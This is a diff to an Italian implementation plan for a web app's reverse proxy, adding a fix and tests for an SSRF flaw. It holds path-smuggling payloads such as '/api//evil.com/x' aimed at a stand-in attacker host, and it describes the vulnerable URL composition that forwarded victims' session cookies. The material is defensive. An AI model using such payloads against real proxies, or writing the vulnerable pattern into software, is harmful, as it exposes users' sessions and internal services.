@@ -91,6 +91,16 @@ Da applicare al file della spec nel Task 6, così il documento resta la fonte af
    contiene React in modalità sviluppo, 300 KB in più su ogni primo caricamento. Aggiungere
    `apps/web/package.json` e `apps/web/smoke.ts` alla tabella delle modifiche e all'elenco dei
    file, e citare la misura 1,2 M → 900 K. Prove e ragionamento nel Task 4.
+6. **§4 descrive il proxy in una forma vulnerabile.** La spec (e questo piano, nella sua prima
+   stesura) componeva il bersaglio con `new URL(path, apiInternalUrl)`. È una **SSRF**: un path
+   che inizia con `//` è un riferimento network-path, quindi `new URL` ne tiene solo lo *schema*
+   e prende l'autorità dal path. `GET /api//evil.com/x` veniva inoltrata a `evil.com` **con i
+   cookie di sessione della vittima** — `Cookie` viaggia con `new Request(target, req)`, e
+   `httpOnly` protegge da JavaScript, non da un proxy che li rispedisce. Il proxy vive dentro la
+   rete privata di Railway, quindi la stessa falla raggiunge gli altri servizi interni. Riscrivere
+   §4 con il setter di `pathname` più la guardia sull'origin, e citare i quattro vettori
+   (`//`, `///`, `\`, `\\`; il backslash arriva già normalizzato in `/` da `new URL(req.url)`).
+   Segnalata da una review di sicurezza automatica il 2026-08-12 e confermata sperimentalmente.
 
 ---
 
@@ -100,7 +110,7 @@ Il cuore della fase. Test prima dell'implementazione.
 
 **Files:**
 - Modify: `apps/web/serve.ts` (firma di `createHandler`, ~15 righe nuove)
-- Test: `apps/web/test/serve.test.ts` (aggiunta di un upstream finto e 7 casi)
+- Test: `apps/web/test/serve.test.ts` (aggiunta di un upstream finto e 8 casi, uno di sicurezza)
 
 **Interfaces:**
 - Consumes: niente da altri task.
@@ -207,7 +217,7 @@ cd apps/web && bun test --isolate --preload ./happydom.ts test/serve.test.ts
 Atteso: **4 pass, 0 fail** (i quattro test statici già presenti). Se qualcuno fallisce,
 `unregister()` ha effetti collaterali non previsti: fermarsi e riferire, non aggirare.
 
-- [ ] **Step 3: Scrivere i sette casi proxy (falliranno)**
+- [ ] **Step 3: Scrivere gli otto casi proxy (falliranno)**
 
 Appendere a `serve.test.ts`:
 
@@ -251,6 +261,22 @@ test('forwards a request body unchanged', async () => {
   expect(res.headers.get('x-saw-body')).toBe('{"descrizione":"spesa","costo":1.5}');
 });
 
+test('cannot be steered off the internal API', async () => {
+  // A leading `//` after the prefix made the URL constructor read the rest of the path as an
+  // authority, so /api//evil.com/x was fetched FROM evil.com with the victim's session
+  // cookies attached — httpOnly stops JavaScript, not a proxy.
+  //
+  // Reaching this upstream AT ALL is the assertion: it only exists on an ephemeral localhost
+  // port, so a header echoed back proves the host came from the base and not from the path.
+  // `\` is covered by the same case — the Request URL parse normalizes it to `/` first. The
+  // path arrives with its leading slashes collapsed, which is Bun's HTTP client and not a
+  // defense: assert it so a change of behaviour is visible rather than load-bearing.
+  for (const suffix of ['//evil.com/x', '///evil.com/x', '/\\evil.com/x', '/\\\\evil.com/x']) {
+    const res = await viaProxy(`/api${suffix}`);
+    expect(res.headers.get('x-saw-path')).toBe('/evil.com/x');
+  }
+});
+
 test('does not intercept application routes', async () => {
   // /statistiche/casa is an SPA route AND an API path shape: only the /api prefix may be
   // proxied, or every deep link would be forwarded to the API and 404.
@@ -270,10 +296,13 @@ test('without API_INTERNAL_URL an /api path is just an SPA route', async () => {
 cd apps/web && bun test --isolate --preload ./happydom.ts test/serve.test.ts
 ```
 
-Atteso: i 4 statici passano; i 7 nuovi falliscono. I primi cinque perché `createHandler`
-accetta un solo argomento e serve il guscio SPA invece di inoltrare (`x-saw-path` sarà
-`null`); il sesto e il settimo potrebbero passare per caso (già servono il guscio) — è
-corretto, sono test di regressione che fissano il confine.
+Atteso: **6 pass, 6 fail** su 12. Dei 4 statici passano tutti; degli 8 nuovi ne falliscono 6,
+perché `createHandler` ignora il secondo argomento e serve il guscio SPA invece di inoltrare
+(`x-saw-path` sarà `null`). I 2 che passano già — `does not intercept application routes` e
+`without API_INTERNAL_URL an /api path is just an SPA route` — sono test **di confine**: dicono
+che il proxy *non* deve attivarsi, e il loro valore è che continuino a passare dopo. Non è un
+errore di conteggio: sapere in anticipo quali test sono di regressione e quali di sviluppo
+evita di inseguire un falso problema a questo step.
 
 - [ ] **Step 5: Implementare il proxy in `serve.ts`**
 
@@ -304,6 +333,14 @@ const API_PREFIX = '/api';
 export const createHandler = (distUrl: URL, apiInternalUrl?: string) => {
 ```
 
+Subito dopo `const distReal = …`, la base parsata una volta sola:
+
+```ts
+  // Parsed once, so a malformed API_INTERNAL_URL fails at boot rather than on the first
+  // request, and so the proxy below has an authority it can compare against.
+  const apiBase = apiInternalUrl === undefined ? undefined : new URL(apiInternalUrl);
+```
+
 Dentro l'handler restituito, sostituire la destrutturazione e inserire il ramo proxy come
 **prima** cosa, prima di ogni accesso al filesystem:
 
@@ -314,11 +351,32 @@ Dentro l'handler restituito, sostituire la destrutturazione e inserire il ramo p
     // Method, headers (Cookie, Origin and the CSRF header included) and body all ride along
     // on `new Request(target, req)` — verified, streamed bodies included. redirect:'manual'
     // leaves any redirect for the browser to follow instead of following it here.
-    if (apiInternalUrl && pathname.startsWith(API_PREFIX + '/')) {
-      const target = new URL(pathname.slice(API_PREFIX.length) + search, apiInternalUrl);
+    if (apiBase && pathname.startsWith(API_PREFIX + '/')) {
+      // The path is applied THROUGH the setter instead of being resolved against the base:
+      // `new URL('//evil.com/x', base)` is a network-path reference, so it keeps only the
+      // base's SCHEME and takes its authority from the path. A request for
+      // /api//evil.com/x was therefore fetched from evil.com carrying the victim's session
+      // cookies — httpOnly stops JavaScript, not a proxy. The setter cannot reach the
+      // authority, so the host comes from API_INTERNAL_URL by construction. (A leading `\`
+      // arrives here already normalized to `/` by the Request URL parse, so both
+      // spellings are the same case.)
+      const target = new URL(apiBase);
+      target.pathname = pathname.slice(API_PREFIX.length);
+      target.search = search;
+      // Unreachable while the setter behaves as specified, and kept anyway: at a boundary
+      // that forwards session cookies, a future parser change — or a rewrite back to
+      // `new URL(path, base)` — must fail closed instead of leaking them.
+      if (target.origin !== apiBase.origin) return new Response('Bad Gateway', { status: 502 });
       return await fetch(new Request(target, req), { redirect: 'manual' });
     }
 ```
+
+⚠️ **Non ricomporre l'URL con `new URL(path, base)`.** È la forma con cui questo task era
+stato scritto in origine, ed è una SSRF: `/api//evil.com/x` veniva inoltrata a `evil.com` **con
+i cookie di sessione della vittima**, perché `Cookie` viaggia con `new Request(target, req)` e
+`httpOnly` ferma JavaScript, non un proxy. Il proxy vive inoltre dentro la rete privata di
+Railway, quindi la stessa falla raggiunge gli altri servizi interni. Il test dello Step 3 e i
+mutanti dello Step 7 esistono per questo.
 
 Il resto del corpo (fallback SPA, `realpathSync`, controllo di contenimento, `no-cache` su
 `/sw.js`) resta **identico**.
@@ -329,15 +387,23 @@ Il resto del corpo (fallback SPA, `realpathSync`, controllo di contenimento, `no
 cd apps/web && bun test --isolate --preload ./happydom.ts test/serve.test.ts
 ```
 
-Atteso: **11 pass, 0 fail**.
+Atteso: **12 pass, 0 fail**.
 
-- [ ] **Step 7: Verificare il mutante**
+- [ ] **Step 7: Verificare i tre mutanti**
 
-Rimuovere temporaneamente `search` dalla composizione di `target`
-(`pathname.slice(API_PREFIX.length)` da solo) e rieseguire.
+Uno per volta, ripristinando ogni volta.
 
-Atteso: fallisce **solo** `keeps the query string`. Se passa tutto, quel test non asserisce
-nulla. Ripristinare.
+1. **Query string.** Rimuovere `target.search = search;`.
+   Atteso: fallisce **solo** `keeps the query string`. Se passa tutto, quel test è decorativo.
+2. **Composizione vulnerabile senza guardia.** Sostituire le tre righe di `target` con
+   `const target = new URL(pathname.slice(API_PREFIX.length) + search, apiBase);` **e**
+   rimuovere la riga della guardia.
+   Atteso: fallisce `cannot be steered off the internal API`, e **impiega centinaia di
+   millisecondi** invece di frazioni: quel tempo è il test che esce davvero in rete verso
+   `evil.com`, cioè l'exploit che avviene. Misurato: 393 ms contro 0,16 ms.
+3. **Composizione vulnerabile con la guardia.** Come sopra, ma lasciando la guardia.
+   Atteso: fallisce lo stesso test, ma **in frazioni di millisecondo** — la guardia scatta
+   prima di aprire un socket. È la prova che è fail-closed e non codice morto.
 
 - [ ] **Step 8: Eseguire la suite web completa, lint e typecheck**
 
@@ -347,7 +413,7 @@ bun run lint
 bun run typecheck
 ```
 
-Atteso: web **97 pass** (90 esistenti + 7), lint pulito, typecheck 3/3. Se `lint` segnala
+Atteso: web **98 pass** (90 esistenti + 8), lint pulito, typecheck 3/3. Se `lint` segnala
 `serve.ts` o `serve.test.ts`, eseguire `bunx prettier --write apps/web/serve.ts apps/web/test/serve.test.ts`.
 
 - [ ] **Step 9: Commit**
@@ -363,6 +429,15 @@ distinti e i cookie SameSite=Lax non viaggerebbero tra loro.
 
 Il proxy e' inerte se API_INTERNAL_URL non e' definita, quindi sviluppo,
 test e harness e2e non cambiano comportamento.
+
+Il path viene applicato con il setter di pathname e non risolto contro la
+base: new URL('//evil.com/x', base) e' un riferimento network-path, tiene
+solo lo SCHEMA della base e prende l'autorita' dal path, quindi
+/api//evil.com/x veniva inoltrata a evil.com con i cookie di sessione
+della vittima (httpOnly ferma JavaScript, non un proxy) e, vivendo il
+proxy nella rete privata di Railway, raggiungeva gli altri servizi
+interni. Col setter l'host viene da API_INTERNAL_URL per costruzione; la
+guardia sull'origin resta come fail-closed.
 
 serve.test.ts chiama GlobalRegistrator.unregister() in beforeAll: sotto
 happy-dom la fetch globale non e' quella di Bun e va in Parse Error. Con
@@ -452,7 +527,7 @@ bun run typecheck
 bun run lint
 ```
 
-Atteso: api/shared **49 pass**, web **97 pass**, typecheck 3/3, lint pulito.
+Atteso: api/shared **49 pass**, web **98 pass**, typecheck 3/3, lint pulito.
 
 - [ ] **Step 5: Commit**
 
@@ -553,7 +628,7 @@ bun run --filter '@gc/web' test
 bun run lint
 ```
 
-Atteso: **97 pass**, lint pulito. (`sw.js` è in `public/`, non entra nel bundle come modulo:
+Atteso: **98 pass**, lint pulito. (`sw.js` è in `public/`, non entra nel bundle come modulo:
 il solo test che lo riguarda verifica che `serve.ts` lo serva con `Cache-Control: no-cache`.)
 
 - [ ] **Step 5: Commit**
@@ -690,7 +765,7 @@ bun run lint
 bun run typecheck
 ```
 
-Atteso: **97 pass** (i 7 casi proxy del Task 1 sono già dentro), lint pulito, typecheck 3/3.
+Atteso: **98 pass** (gli 8 casi proxy del Task 1 sono già dentro), lint pulito, typecheck 3/3.
 
 I test unitari non toccano il bundle: girano sui sorgenti sotto happy-dom, quindi React resta
 in dev-mode lì e nulla cambia. L'`e2e`, invece, costruisce l'artefatto e da ora gira contro
@@ -984,6 +1059,9 @@ Aprire `http://localhost:3000` e verificare:
 - [ ] i sei schermi `statistiche` disegnano i grafici;
 - [ ] deep link diretto su `http://localhost:3000/statistiche/casa`: carica l'app, non 404;
 - [ ] `curl -s http://localhost:3000/api/health` → `{"status":"ok"}` (il proxy inoltra);
+- [ ] `curl -s "http://localhost:3000/api//example.com/"` → la risposta d'errore **dell'api**
+      (404 di Elysia), **non** il contenuto di example.com: è la SSRF del Task 1, verificata
+      end-to-end oltre che nei test;
 - [ ] il service worker si registra e, in Application → Cache Storage, **nessuna** risposta
       `/api/*` è in cache.
 
@@ -1000,7 +1078,7 @@ bun run --filter '@gc/web' smoke
 bun run e2e
 ```
 
-Atteso: api/shared **49 pass**, web **97 pass**, typecheck 3/3, lint pulito, smoke ok, e2e
+Atteso: api/shared **49 pass**, web **98 pass**, typecheck 3/3, lint pulito, smoke ok, e2e
 **17 pass** (i cinque file esistenti restano validi: descrivono la faccia cross-origin
 dell'api, che il dominio pubblico dell'api mantiene reale).
 
@@ -1051,6 +1129,6 @@ identici in tutti i task, e coerenti con `apps/web/src/config.ts` (che non cambi
 
 **Conteggi attesi.** Baseline misurata il 2026-08-12 su `feat/phase6-cutover` @ `e91329d`:
 web **90 pass / 22 file** (di cui 4 in `serve.test.ts`), api+shared **49 pass / 14 file**,
-e2e **17**, bundle **1,2 M**. Dopo la Fase 6: web → **97** (7 casi proxy), api/shared e e2e
+e2e **17**, bundle **1,2 M**. Dopo la Fase 6: web → **98** (8 casi proxy, uno dei quali di sicurezza), api/shared e e2e
 invariati, bundle → **900 K**. Se la baseline non corrisponde all'inizio dell'esecuzione,
 `master` si è mosso: allineare il branch prima di iniziare, non adattare i numeri.
